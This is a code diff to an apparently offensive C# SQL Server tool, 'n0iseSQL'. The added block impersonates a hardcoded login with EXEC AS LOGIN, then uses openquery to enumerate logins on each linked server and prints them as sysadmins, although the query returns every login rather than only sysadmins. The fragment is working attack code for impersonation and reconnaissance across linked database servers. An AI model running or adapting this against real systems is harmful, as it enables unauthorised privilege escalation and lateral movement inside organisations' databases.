@@ -239,6 +239,24 @@ namespace n0iseSQL
 
                 foreach (String identifiedLinkedServer in identifiedLinkedServers)
                 {
+                    //sysadmins:
+                    String queryLinkedServerSysadmins = String.Format("EXEC AS LOGIN = 'dev_int';select * from openquery(\"{0}\",'select name from master..syslogins');", identifiedLinkedServer);
+                    command = new SqlCommand(queryLinkedServerSysadmins, con);
+                    try
+                    {
+                        reader = command.ExecuteReader();
+                        while (reader.Read())
+                        {
+                            Console.WriteLine("[+] sysadmin on linked server {0}: {1}", identifiedLinkedServer, reader[0]);
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("[!] Error identifying sysadmin on linked server {0}: {1}", identifiedLinkedServer, ex.Message.ToString());
+                    }
+
+                    reader.Close();
+
                     //security context:
                     String queryLinkedServerContext = String.Format("select myuser from openquery(\"{0}\",'select SYSTEM_USER as myuser');", identifiedLinkedServer);
                     command = new SqlCommand(queryLinkedServerContext, con);
